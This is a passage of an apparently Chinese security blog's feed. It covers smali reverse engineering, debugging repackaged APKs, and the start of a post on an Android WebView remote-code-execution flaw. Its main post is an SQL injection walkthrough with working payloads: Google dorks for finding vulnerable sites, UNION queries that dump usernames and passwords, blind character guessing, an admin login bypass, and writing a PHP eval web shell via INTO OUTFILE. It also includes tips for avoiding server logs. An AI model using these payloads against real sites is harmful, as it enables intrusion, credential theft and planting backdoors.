&#35843;&#29992;v0&#30340;show&#26041;&#27861;&#10;    .line 34&#10;    return-void&#10;.end method</span><br></pre></td></tr></table></figure>
<p>exit退出事件代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># virtual methods&#10;.method public onClick(Landroid/content/DialogInterface;I)V&#10;    .locals 1&#10;    .param p1, &#34;dialog&#34;    # Landroid/content/DialogInterface;&#10;    .param p2, &#34;which&#34;    # I&#10;    # &#20256;&#21442; p1, p2, #&#21518;&#36793;&#20026;&#21442;&#25968;&#31867;&#22411;&#10;    .prologue&#10;    .line 29&#10;    invoke-interface &#123;p1&#125;, Landroid/content/DialogInterface;-&#62;dismiss()V&#10;    # &#35843;&#29992;dialog&#20013;&#30340;dismiss()&#25509;&#21475;&#10;    .line 30&#10;    iget-object v0, p0, Lcom/reverse/idhyt/androidreverse/ClickButton$1$1;-&#62;this$1:Lcom/reverse/idhyt/androidreverse/ClickButton$1;&#10;    iget-object v0, v0, Lcom/reverse/idhyt/androidreverse/ClickButton$1;-&#62;this$0:Lcom/reverse/idhyt/androidreverse/ClickButton;&#10;    invoke-virtual &#123;v0&#125;, Lcom/reverse/idhyt/androidreverse/ClickButton;-&#62;finish()V&#10;    # &#20197;&#19978;&#19977;&#34892;&#25214;&#21040;&#39030;&#32423;&#29238;&#31867;&#23545;&#35937;&#65292;&#24182;&#35843;&#29992;finish&#20851;&#38381;Activity&#10;    .line 31&#10;    return-void&#10;.end method</span><br></pre></td></tr></table></figure>
<h2 id="其他">其他</h2><h3 id="函数返回结果">函数返回结果</h3><p>在Java代码中调用函数和返回函数结果是一条语句完成的，而在smali里则需要分开来完成，在使用上述指令后，如果调用的函数返回非void，那么还需要用到move-result（返回基本数据类型）和move-result-object（返回对象）指令</p>
<h3 id="数组的表示形式">数组的表示形式</h3><p>[I——表示一个整型一维数组，相当于java中的int[]。<br>对于多维数组，只要增加[就行了。[[I相当于int[][]，[[[I相当于int[][][]。注意每一维的最多255个。<br>对象数组的表示：[Ljava/lang/String;表示一个String对象数组。</p>
<h3 id="字段的表示形式：">字段的表示形式：</h3><p>Lpackage/name/ObjectName;-&gt;FieldName:Ljava/lang/String;<br>即包名，字段名和各字段类型。</p>
<h3 id="寄存器-1">寄存器</h3><p>在dalvik字节码中，寄存器都是32位的，能够支持任何类型。64位类型（Long和Double型）用2个寄存器表示。<br>有两种方式指定一个方法中有多少寄存器是可用的,.registers指令指定了方法中寄存器的总数,.locals指令表明了方法中非参寄存器的数量。</p>
<p>方法的传参<br>1.当一个方法被调用的时候，方法的参数被置于最后N个寄存器中。如果一个方法有2个参数，5个寄存器（v0-v4），那么参数将置于最后2个寄存器——v3和v4。</p>
<p>2.非静态方法中的第一个参数总是调用该方法的对象。<br>例如，非静态方法LMyObject;-&gt;callMe(II)V有2个整型参数，另外还有一个隐含的LMyObject;参数，所以总共有3个参数。<br>假如在该方法中指定了5个寄存器（v0-v4），以.registers方式指定5个或以.locals方式指定2个(即2个local寄存器+3个参数寄存器)。<br>当该方法被调用的时候，调用该方法的对象（即this引用）存放在v2中，第一个整型参数存放在v3中，第二个整型参数存放在v4中。</p>
<p>3.对于静态方法除了没有隐含的this参数外其它都一样。</p>
<h2 id="参考">参考</h2><p>1.函数调用部分参考 <a href="http://blog.csdn.net/lpohvbe/article/details/7981386" target="_blank" rel="external">APK反编译之一：基础知识</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<p>安卓逆向笔记,熟悉smali语法和函数调用<br>一个按钮程序,实现功能：点击 - 弹窗 - 退出</p>
<h2 id="源码">源码</h2><p>主功能代码</p>
<figure class="highlight plain"><table><tr><td clas]]>
    </summary>
    
      <category term="smali" scheme="http://blog.idhyt.xyz/tags/smali/"/>
    
      <category term="android" scheme="http://blog.idhyt.xyz/categories/android/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Netbeans动态调试smali文件]]></title>
    <link href="http://blog.idhyt.xyz/2015/05/08/4-android-netbeans-debug-smali/"/>
    <id>http://blog.idhyt.xyz/2015/05/08/4-android-netbeans-debug-smali/</id>
    <published>2015-05-08T13:11:11.000Z</published>
    <updated>2015-12-27T08:55:30.000Z</updated>
    <content type="html"><![CDATA[<p>通过修改apk包来实现动态调试smali文件。</p>
<h2 id="调试工具">调试工具</h2><p><a href="https://netbeans.org/features/java/index.html" target="_blank" rel="external">Netbeans</a>java版本即可<br><a href="https://ibotpeaches.github.io/Apktool/" target="_blank" rel="external">apktool</a>解包打包<br><a href="https://code.google.com/p/signapk/downloads/list" target="_blank" rel="external">signapk</a>签名</p>
<h2 id="生成可供调试的apk">生成可供调试的apk</h2><p>以app-release.apk说明</p>
<h3 id="解包">解包</h3><pre><code>java -jar apktool<span class="class">.jar</span> d -d app-release<span class="class">.apk</span> 
</code></pre><p>-d参数用于生成调试版本，最后边可加参数 -o out 解包到指定out目录</p>
<h3 id="找到入口函数">找到入口函数</h3><p>通过查看AndroidManifest.xml获得入口activity，然后找到oncreate()函数。<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/android-netbeans-debug-smali-1.png" alt=""></p>
<h3 id="添加调试代码">添加调试代码</h3><p>在入口函数代码</p>
<pre><code>invoke-<span class="keyword">super</span> {p0, p1}, Landroid<span class="regexp">/app/</span>Activity;-&gt;onCreate(Landroid<span class="regexp">/os/</span>Bundle;)V
</code></pre><p>添加调试代码</p>
<pre><code>invoke-<span class="keyword">static</span> {}, Landroid<span class="regexp">/os/</span>Debug;-&gt;waitForDebugger()V
</code></pre><p><img src="http://7xi9s3.com1.z0.glb.clouddn.com/android-netbeans-debug-smali-2.png" alt="">    </p>
<h3 id="重打包">重打包</h3><p>apktool重打包，命令</p>
<pre><code>java -jar apktool<span class="class">.jar</span> <span class="tag">b</span> app-release -o debug.apk
</code></pre><p>打包过后解包文件根目录会出现一个build目录（后期调试需要将其删除）</p>
<h3 id="签名">签名</h3><pre><code><span class="tag">java</span> <span class="tag">-jar</span> "<span class="tag">signapk</span><span class="class">.jar</span>" "<span class="tag">testkey</span><span class="class">.x509</span><span class="class">.pem</span>" "<span class="tag">testkey</span><span class="class">.pk8</span>" <span class="tag">debug</span><span class="class">.apk</span> <span class="tag">debug-sign</span><span class="class">.apk</span>
</code></pre><p>成功生成了一个支持调试的debug-sign.apk文件</p>
<p>可以写一个批处理文件apksign.bat</p>
<pre><code><span class="variable">@echo</span> off
set PATH=<span class="variable">%CD</span><span class="variable">%;</span><span class="variable">%PATH</span><span class="variable">%;</span>
java -jar <span class="string">"%~dp0signapk.jar"</span> <span class="string">"%~dp0testkey.x509.pem"</span> <span class="string">"%~dp0testkey.pk8"</span> <span class="variable">%1</span> <span class="variable">%2</span>
</code></pre><p>签名时直接输入 signapk.bat old.apk new.apk</p>
<h3 id="安装apk">安装apk</h3><p>虚拟机安装重新打包签名的调试debug-sign.apk，这里我用的虚拟机为genymotion</p>
<h2 id="netbeans设置">netbeans设置</h2><p>1.删除out目录下的build文件夹</p>
<p>2.打开netbeans，选择“文件”-“新建项目”-“基于现有源代码的java项目”<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/android-netbeans-debug-smali-3.png" alt="">  </p>
<p>3.在“项目文件夹处”选择apk解包目录<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/android-netbeans-debug-smali-4.png" alt="">  </p>
<p>4.在“源包文件夹”出选择解包目录下的smali文件夹<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/android-netbeans-debug-smali-5.png" alt="">  </p>
<p>5.点击完成，项目创建完毕</p>
<p>6.在模拟器中运行刚刚安装的重新打包附带签名的debug-sign.apk，程序会处于挂起状态</p>
<p>7.在netbeans中找到入口activity的oncreate函数，在刚才添加的调试代码下一行下代码断点<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/android-netbeans-debug-smali-6.png" alt="">  </p>
<p>8.在netbeans中，选择“调试”-“连接调试器”,设置如下<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/android-netbeans-debug-smali-7.png" alt=""> </p>
<p>连接过后程序会暂停到断点处，接下来就可以进行单步调试了。</p>
<p>9.端口号可在DDMS中查看<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/android-netbeans-debug-smali-8.png" alt=""> </p>
<h2 id="参考">参考</h2><p><a href="http://0nly3nd.sinaapp.com/?p=576" target="_blank" rel="external">Netbeans 6.8 + apktool_2.0.0b9 动态调试smali文件</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<p>通过修改apk包来实现动态调试smali文件。</p>
<h2 id="调试工具">调试工具</h2><p><a href="https://netbeans.org/features/java/index.html" target="_blank" rel="extern]]>
    </summary>
    
      <category term="debug" scheme="http://blog.idhyt.xyz/tags/debug/"/>
    
      <category term="android" scheme="http://blog.idhyt.xyz/categories/android/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[SQL注入测试思路]]></title>
    <link href="http://blog.idhyt.xyz/2015/04/21/2-sql-inject/"/>
    <id>http://blog.idhyt.xyz/2015/04/21/2-sql-inject/</id>
    <published>2015-04-21T06:46:11.000Z</published>
    <updated>2015-12-27T08:56:25.000Z</updated>
    <content type="html"><![CDATA[<p>SQL注入测试思路整理<a id="more"></a></p>
<h2 id="一-搜索可能有漏洞的网站">一.搜索可能有漏洞的网站</h2><p>利用google收集信息，可以搜索的关键词很多，网上有个术语，把这些称作“Google Dorks”</p>
<pre><code><span class="string">inurl:</span>index.php?id=
inurl:gallery.php?id=
inurl:article.php?id=
inurl:pageid=
<span class="string">site:</span> <span class="string">http:</span><span class="comment">// www.<span class="label">xxx.com  inurl:php?id= //针对某个特定的网站</span></span>
</code></pre><h2 id="二-检测一下目标是否有明显漏洞">二.检测一下目标是否有明显漏洞</h2><p>搜索结果会出来一大堆，一个简单的测试方式是在Url末尾的数字后面加单引号或者加上 and 1=1 或者 1=2<br>看看界面是否有明显变化或者直接就给出SQL的报错语句了。</p>
<pre><code><span class="keyword">http</span>://localhost/test/<span class="built_in">get</span>.php?id=<span class="number">1</span> <span class="operator">and</span> <span class="number">1</span>=<span class="number">1</span>
<span class="keyword">http</span>://localhost/test/<span class="built_in">get</span>.php?id=<span class="number">1</span> <span class="operator">and</span> <span class="number">1</span>=<span class="number">2</span>
</code></pre><p><img src="http://7xi9s3.com1.z0.glb.clouddn.com/inject-1.png" alt=""><br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/inject-2.png" alt=""></p>
<h2 id="三-看看该表有多少个字段">三.看看该表有多少个字段</h2><p>测试语句： order by number<br>一般从小往大的尝试，比如1,2,3,4,5都能看见网页界面，然后6就报错了，那么很明显这个网页对应的表只有5个字段</p>
<h2 id="四-找到有漏洞的字段">四.找到有漏洞的字段</h2><p>将存在注入点的字段值改为负，目的是不显示数据<br>然后注入语句为 union select 1,2,3,4,5 (数字为字段个数)<br>找到漏洞的字段，即能被显示出来的字段，用于显示获取的注入信息</p>
<h2 id="五-找到对应的版本号，数据库和用户">五.找到对应的版本号，数据库和用户</h2><p>将第四部显示的字段值分别替换version(), user(), database()获取数据库信息<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/inject-3.png" alt=""></p>
<h2 id="六-爆库">六.爆库</h2><h3 id="MySql-version()_&gt;_5">MySql.version() &gt; 5</h3><p>如果获取的版本为Mysql 5以上，则有内置库information_schema，存储着mysql的所有数据库和表结构信息</p>
<h4 id="1-获取该库下其他表">1.获取该库下其他表</h4><p>将漏洞字段替换为group_concat(table_name) 然后语句后边添加 from information_schema.tables where table_schema=database()</p>
<pre><code>http://localhost/test/get.php?id=-1 union <span class="operator"><span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name),<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> information_schema.<span class="keyword">tables</span> <span class="keyword">where</span> table_schema=<span class="keyword">database</span>()</span>
</code></pre><p><img src="http://7xi9s3.com1.z0.glb.clouddn.com/inject-4.png" alt=""></p>
<h4 id="2-获取表中字段名">2.获取表中字段名</h4><p>把”group_concat(table_name)”替换成”group_concat(column_name)”<br>把”from information_schema.tables where table_schema=database()–” 替换成”FROM information_schema.columns WHERE table_name=表名—<br>其中表明需要编码</p>
<pre><code>http://localhost/test/get.php?id=-1 union <span class="operator"><span class="keyword">select</span> <span class="keyword">group_concat</span>(column_name),<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> information_schema.<span class="keyword">columns</span> <span class="keyword">where</span> table_name=<span class="built_in">CHAR</span>(<span class="number">115</span>, <span class="number">113</span>, <span class="number">108</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">106</span>, <span class="number">101</span>, <span class="number">99</span>, <span class="number">116</span>) //table_name = sqlinject</span>
</code></pre><p><img src="http://7xi9s3.com1.z0.glb.clouddn.com/inject-5.png" alt=""></p>
<h4 id="3-查询表获得账户等信息">3.查询表获得账户等信息</h4><p>例如获取user,password,email 字段内容<br>用group_concat(user,0x3a, password,0x3a, email)替换之前内容，数据库选择sqlinject，其中0x3a为分隔符</p>
<pre><code>http://localhost/test/get.php?id=-1 union <span class="operator"><span class="keyword">select</span> <span class="keyword">group_concat</span>(<span class="keyword">user</span>,<span class="number">0x3a</span>, <span class="keyword">password</span>,<span class="number">0x3a</span>, email),<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> sqlinject</span>
</code></pre><p><img src="http://7xi9s3.com1.z0.glb.clouddn.com/inject-6.png" alt=""></p>
<h3 id="MySql-version()_&lt;_5">MySql.version() &lt; 5</h3><p>如果获取的版本为Mysql 5以下，就需要暴力猜解表名</p>
<h4 id="1-猜解表名">1.猜解表名</h4><p>一般的表的名称无非是admin adminuser user pass password 等</p>
<pre><code><span class="keyword">and</span> <span class="number">0</span>&lt;&gt;(<span class="keyword">select</span> count<span class="comment">(*) from *)</span>
<span class="keyword">and</span> <span class="number">0</span>&lt;&gt;(<span class="keyword">select</span> count<span class="comment">(*) from admin) — 判断是否存在admin这张表</span>
</code></pre><h4 id="2-猜帐号数目">2.猜帐号数目</h4><p>如果遇到0&lt; 返回正确页面 1&lt;返回错误页面说明帐号数目就是1个</p>
<pre><code><span class="keyword">and</span> <span class="number">0</span>&lt;(<span class="keyword">select</span> count<span class="comment">(*) from admin)
and 1&lt;(select count(*)</span> <span class="keyword">from</span> admin)
</code></pre><h4 id="3-猜解字段名称">3.猜解字段名称</h4><p>一般字段名是user,password,name,pwd,email,phone等<br>在len( ) 括号里面加上我们想到的字段名称.</p>
<pre><code><span class="keyword">and</span> <span class="number">1</span>=(<span class="keyword">select</span> count<span class="comment">(*) from admin where len(*)</span>&gt;<span class="number">0</span>)–
<span class="keyword">and</span> <span class="number">1</span>=(<span class="keyword">select</span> count<span class="comment">(*) from admin where len(用户字段名称name)&gt;0)
and 1=(select count(*)</span> <span class="keyword">from</span> admin <span class="keyword">where</span> len(_blank&gt;密码字段名称password)&gt;<span class="number">0</span>)
</code></pre><h4 id="4-猜解各个字段的长度">4.猜解各个字段的长度</h4><p>猜解长度就是把&gt;0变换,直到返回正确页面为止</p>
<pre><code><span class="keyword">and</span> <span class="number">1</span>=(<span class="keyword">select</span> count<span class="comment">(*) from admin where len(*)</span>&gt;<span class="number">0</span>)
<span class="keyword">and</span> <span class="number">1</span>=(<span class="keyword">select</span> count<span class="comment">(*) from admin where len(name)&gt;6) 错误
and 1=(select count(*)</span> <span class="keyword">from</span> admin <span class="keyword">where</span> len(name)&gt;<span class="number">5</span>) 正确 长度是<span class="number">6</span>
<span class="keyword">and</span> <span class="number">1</span>=(<span class="keyword">select</span> count<span class="comment">(*) from admin where len(name)=6) 正确

and 1=(select count(*)</span> <span class="keyword">from</span> admin <span class="keyword">where</span> len(password)&gt;<span class="number">11</span>) 正确
<span class="keyword">and</span> <span class="number">1</span>=(<span class="keyword">select</span> count<span class="comment">(*) from admin where len(password)&gt;12) 错误 长度是12
and 1=(select count(*)</span> <span class="keyword">from</span> admin <span class="keyword">where</span> len(password)=<span class="number">12</span>) 正确
</code></pre><h4 id="5-猜解字符">5.猜解字符</h4><pre><code><span class="keyword">and</span> <span class="number">1</span>=(<span class="keyword">select</span> count<span class="comment">(*) from admin where left(name,1)=a) —猜解用户帐号的第一位
and 1=(select count(*)</span> <span class="keyword">from</span> admin <span class="keyword">where</span> left(name,<span class="number">2</span>)=ab)—猜解用户帐号的第二位
</code></pre><p>就这样一次加一个字符这样猜,猜到够你刚才猜出来的多少位了就对了,帐号就算出来了</p>
<pre><code>and <span class="number">1</span>=<span class="list">(<span class="keyword">select</span> top <span class="number">1</span> count<span class="list">(<span class="keyword">*</span>)</span> from Admin where Asc<span class="list">(<span class="keyword">mid</span><span class="list">(<span class="keyword">pass</span>,<span class="number">5</span>,<span class="number">1</span>)</span>)</span>=51)</span>
</code></pre><p>这个查询语句可以猜解中文的用户和_blank&gt;密码.只要把后面的数字换成中文的ASSIC码就OK.最后把结果再转换成字符.</p>
<pre><code>group by users.id having 1=1
group by users.id, users.username, users.password, users.privs having 1=1
; <span class="operator"><span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">users</span> <span class="keyword">values</span>( <span class="number">666</span>, attacker, foobar, <span class="number">0xffff</span> )
<span class="keyword">UNION</span> <span class="keyword">Select</span> TOP <span class="number">1</span> COLUMN_blank&gt;_NAME <span class="keyword">FROM</span> INFORMATION_blank&gt;_SCHEMA.<span class="keyword">COLUMNS</span> <span class="keyword">Where</span> TABLE_blank&gt;_NAME=logintable
<span class="keyword">UNION</span> <span class="keyword">Select</span> TOP <span class="number">1</span> COLUMN_blank&gt;_NAME <span class="keyword">FROM</span> INFORMATION_blank&gt;_SCHEMA.<span class="keyword">COLUMNS</span> <span class="keyword">Where</span> TABLE_blank&gt;_NAME=logintable <span class="keyword">Where</span> COLUMN_blank&gt;_NAME <span class="keyword">NOT</span> <span class="keyword">IN</span> (login_blank&gt;_id)
<span class="keyword">UNION</span> <span class="keyword">Select</span> TOP <span class="number">1</span> COLUMN_blank&gt;_NAME <span class="keyword">FROM</span> INFORMATION_blank&gt;_SCHEMA.<span class="keyword">COLUMNS</span> <span class="keyword">Where</span> TABLE_blank&gt;_NAME=logintable <span class="keyword">Where</span> COLUMN_blank&gt;_NAME <span class="keyword">NOT</span> <span class="keyword">IN</span> (login_blank&gt;_id,login_blank&gt;_name)
<span class="keyword">UNION</span> <span class="keyword">Select</span> TOP <span class="number">1</span> login_blank&gt;_name <span class="keyword">FROM</span> logintable
<span class="keyword">UNION</span> <span class="keyword">Select</span> TOP <span class="number">1</span> <span class="keyword">password</span> <span class="keyword">FROM</span> logintable <span class="keyword">where</span> login_blank&gt;_name=Rahul</span>
</code></pre><h2 id="七-挂马">七.挂马</h2><h3 id="1-判断数据库权限">1.判断数据库权限</h3><pre><code>and <span class="function"><span class="title">ord</span><span class="params">(mid(user()</span></span>,<span class="number">1</span>,<span class="number">1</span>))=<span class="number">114</span> <span class="comment">/* 返回正常说明为root</span>
</code></pre><p><img src="http://7xi9s3.com1.z0.glb.clouddn.com/inject-7.png" alt=""><br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/inject-8.png" alt=""></p>
<h3 id="2-直接写马">2.直接写马</h3><ul>
<li>1.知道站点物理路径</li>
<li>2.有足够大的权限(如root)（可以用select …. from mysql.user测试）</li>
<li>3.magic_quotes_gpc()=OFF</li>
</ul>
<p>select 一句话 into outfile “物理路径”<br>&lt;?php @eval($_POST[‘igigt’]);?&gt; 转为16进制形式  0x3C3F70687020406576616C28245F504F53545B276967696774275D293B3F3E</p>
<pre><code>http://localhost/test/get_root.php?id=1 union select <span class="number">0x3C3F70</span><span class="number">68702040657</span><span class="number">6616C28245</span>F<span class="number">504F53545</span>B<span class="number">27696769677</span><span class="number">4275D293</span>B3F3E,2,3,4 from mysql.user into outfile "d:\igigt.php"
</code></pre><p><img src="http://7xi9s3.com1.z0.glb.clouddn.com/inject-9.png" alt=""></p>
<p>在D盘目录下即可找到一句话，然后菜刀连<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/inject-10.png" alt=""></p>
<h3 id="3-通过建临时表写马">3.通过建临时表写马</h3><pre><code>CREATE TABLE <span class="function"><span class="title">igigt</span><span class="params">(cmd text)</span></span>
INSERT INTO <span class="function"><span class="title">igigt</span><span class="params">(cmd)</span></span> <span class="function"><span class="title">VALUES</span><span class="params">(<span class="string">"&lt;?php @eval($_POST['igigt']);?&gt;"</span>)</span></span> <span class="comment">// 或(推荐0x方式)</span>
INSERT INTO <span class="function"><span class="title">igigt</span><span class="params">(cmd)</span></span> <span class="function"><span class="title">VALUES</span><span class="params">(<span class="number">0</span>x3C3F70687020406576616C28245F504F53545B276967696774275D293B3F3E)</span></span>
SELECT cmd FROM igigt into OUTFILE <span class="string">"d:\\test.php"</span>
DROP TABLE igigt
</code></pre><h3 id="4-LOAD_FILE">4.LOAD_FILE</h3><p>LOAD_FILE可以加载文件，对获取网站信息以及物理路径有很大帮助，不过同outfile一样也需要root权限</p>
<pre><code><span class="rule"><span class="attribute">http</span>:<span class="value">//localhost/test/get_root.php?id=<span class="number">1</span> union select <span class="function">LOAD_FILE</span>(<span class="string">"d:\\igigt.php"</span>)</span></span>
</code></pre><p><img src="http://7xi9s3.com1.z0.glb.clouddn.com/inject-13.png" alt=""></p>
<h3 id="5-权限不够">5.权限不够</h3><p>提权或者扫后台，解密用户名密码(一般为MD5加密)登录之后挂马</p>
<h2 id="八-其他">八.其他</h2><h3 id="1-登录弱密码">1.登录弱密码</h3><p>user:admin’ or ‘1’=’1<br>pwd:admin’ or ‘1’=’1</p>
<h3 id="2-确认数据库类型">2.确认数据库类型</h3><p>只有MYSQL解析</p>
<pre><code><span class="keyword">and</span> <span class="keyword">ord</span>(mid(version(),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">51</span>/* 确认数据库版本 <span class="number">51</span>是ASCII码<span class="number">3</span> 正确则&gt;<span class="number">4.0</span> 错误则&lt;<span class="number">4.0</span>
http://localhost/test/get.php?id=<span class="number">1</span> <span class="keyword">and</span> <span class="keyword">ord</span>(mid(version(),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">51</span>
</code></pre><p><img src="http://7xi9s3.com1.z0.glb.clouddn.com/inject-11.png" alt=""></p>
<p>两错为access 一错二对为mssql(SQLServer)</p>
<pre><code><span class="keyword">and</span> (<span class="keyword">select</span> count<span class="comment">(*) from sysobjects)&gt;0 //msysobjects为access特有 但默认无权限读取
and (select count(*)</span> <span class="keyword">from</span> msysobjects)&gt;<span class="number">0</span> <span class="comment">//sysobjects为mssql特有</span>
</code></pre><h3 id="3-操作系统信息">3.操作系统信息</h3><pre><code>and <span class="number">1</span>=<span class="number">2</span> <span class="class"><span class="keyword">union</span> <span class="title">all</span> <span class="title">select</span> @@<span class="title">global</span>.<span class="title">version_compile_os</span> <span class="title">from</span> <span class="title">mysql</span>.<span class="title">user</span></span>
</code></pre><p>访问mysql.user需要root权限<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/inject-12.png" alt=""></p>
<h3 id="4-利用内置变量">4.利用内置变量</h3><pre><code><span class="rule"><span class="attribute">http</span>:<span class="value">//www.mytest.com/showdetail.asp?id=<span class="number">49</span> </span></span>;<span class="tag">and</span> <span class="tag">user</span>&gt;0
</code></pre><p>user是SQLServer的一个内置变量，它的值是当前连接的用户名，类型为 nvarchar。<br>拿一个 nvarchar 的值跟 int 的数 0 比较，系统会先试图将 nvarchar 的值转成 int 型，<br>当然，转的过程中肯定会出错，SQLServer 的出错提示是：将 nvarchar 值 ”abc” 转换数据类型为 int 的列时发生语法错误，<br>abc 正是变量 user 的值，这样，不废吹灰之力就拿到了数据库的用户名。</p>
<p>类似的例子and user&gt;0，作用是获取连接用户名，db_name()是另一个系统变量，返回的是连接的数据库名。</p>
<h3 id="5-下载网站备份文件">5.下载网站备份文件</h3><pre><code>http://Site/url.asp?id=1;<span class="operator"><span class="keyword">backup</span> <span class="keyword">database</span> 数据库名 <span class="keyword">to</span> disk=’<span class="keyword">c</span>:\\inetpub\\wwwroot1.db’;</span><span class="comment">--</span>
</code></pre><p>拿到的数据库名，加上某些 IIS 出错暴露出的绝对路径，将数据库备份到 Web 目录下面，再用 HTTP 把整个数据库就完完整整的下载回来，所有的管理员及用户密码都一览无遗！<br>或者也可以尝试扫描整个网站目录，也有机会下载到网站备份文件。</p>
<h3 id="6-经验小结">6.经验小结</h3><p>1.有些人会过滤 Select、Update、Delete 这些关键字，但偏偏忘记区分大小写，所以大家可以用 selecT 这样尝试一下。<br>2.在猜不到字段名时，不妨看看网站上的登录表单，一般为了方便起见，字段名都与表单的输入框取相同的名字。<br>3.地址栏的+号传入程序后解释为空格，%2B 解释为 + 号，%25 解释为 % 号，具体可以参考 URLEncode 的相关介绍。<br>4.用Get方法注入时，IIS会记录你所有的提交字符串，对 Post 方法做则不记录，所以能用 Post 的网址尽量不用Get。<br>5.猜解Access时只能用Ascii逐字解码法，SQLServer也可以用这种方法，只需要两者之间的区别即可，但是如果能用 SQLServer 的报错信息把值暴露出来，那效率和准确率会有极大的提高。</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>SQL注入测试思路整理]]>
    
    </summary>
    
      <category term="inject" scheme="http://blog.idhyt.xyz/tags/inject/"/>
    
      <category term="web" scheme="http://blog.idhyt.xyz/categories/web/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[WebView组件远程代码执行漏洞]]></title>
    <link href="http://blog.idhyt.xyz/2015/04/09/2-abusing-webview/"/>
    <id>http://blog.idhyt.xyz/2015/04/09/2-abusing-webview/</id>
    <published>2015-04-09T03:30:21.000Z</published>
    <updated>2015-04-11T03:11:11.000Z</updated>
    <content type="html"><![CDATA[<p>&#160; &#160; &#160; &#160;在android的sdk中封装了webView控件,在webView下有一个非常特殊的接口函数addJavascriptInterface,利用这个接口函数可实现穿透webkit控制android 本机。<br><a id="more"></a></p>
<p>###简介<br>&#160; &#160; &#160; &#160;Webview是Android用于浏览网页的组件，它的接口函数addJavascriptInterface可以实现网页JS与本地JAVA的交互，但是没有限制已注册JAVA类的方法调用，导致可以利用反射机制调用未注册的其它任何JAVA类。当Android用户访问恶意网页时，会被迫执行系统命令，如安装木马、盗取敏感数据等。</p>
<p>###漏洞详情</p>
<p>构建一个使用Webview组件的程序</p>
<p>####1. AndroidManifest.xml添加网络访问权限<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">uses-permission</span> <span class="attribute">android:name</span>=<span class="value">"android.permission.INTERNET"</span>/&gt;</span></span><br></pre></td></tr></table></figure></p>
<p><br></p>
<p>####2. activity_my.xml添加Webview控件<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">WebView</span></span><br><span class="line">     <span class="attribute">android:layout_width</span>=<span class="value">"wrap_content"</span></span><br><span class="line">     <span class="attribute">android:layout_height</span>=<span class="value">"wrap_content"</span></span><br><span class="line">     <span class="attribute">android:id</span>=<span class="value">"@+id/webView"</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="title">WebView</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>####3. MainActivity.java添加关键代码<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">    setContentView(R.layout.activity_main);</span><br><span class="line">    <span class="comment">// add webview func</span></span><br><span class="line">    WebView webview = (WebView)findViewById(R.id.webView);</span><br><span class="line">    webview.getSettings().setJavaScriptEnabled(<span class="keyword">true</span>);</span><br><span class="line">    webview.loadUrl(<span class="string">"http://info.idhyt.xyz/vultest/checkwebview.html"</span>);<span class="string">");</span></span><br></pre></td></tr></table></figure></p>
<p><br></p>
<p>####4. 测试页面<br>&#160; &#160; &#160; &#160;<a href="http://info.idhyt.xyz/vultest/checkwebview.html" target="_blank" rel="external">webview漏洞测试页面</a><br>&#160; &#160; &#160; &#160;<a href="http://info.idhyt.xyz/vultest/webviewexp.html" target="_blank" rel="external">webview漏洞利用页面</a><br><br></p>
<p>####5. 测试结果<br>&#160; &#160; &#160; &#160;在没有使用addJavascriptInterface接口函数的情况下，<br>也会存在远程代码执行漏洞，原因是webview组件默认调用”searchBoxJavaBridge_”对象。<br>&#160; &#160; &#160; &#160;<img src="http://7xi9s3.com1.z0.glb.clouddn.com/webview-1.png" alt=""></p>
<p>&#160; &#160; &#160; &#160;当使用addJavascriptInterface接口函数时，代码改为<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">WebView webview = (WebView)findViewById(R.id.webView);</span><br><span class="line">webview.getSettings().setJavaScriptEnabled(<span class="keyword">true</span>);</span><br><span class="line">webview.getSettings().setJavaScriptCanOpenWindowsAutomatically(<span class="keyword">true</span>);</span><br><span class="line">webview.addJavascriptInterface(<span class="keyword">new</span> test(), <span class="string">"test"</span>);</span><br><span class="line">webview.loadUrl(<span 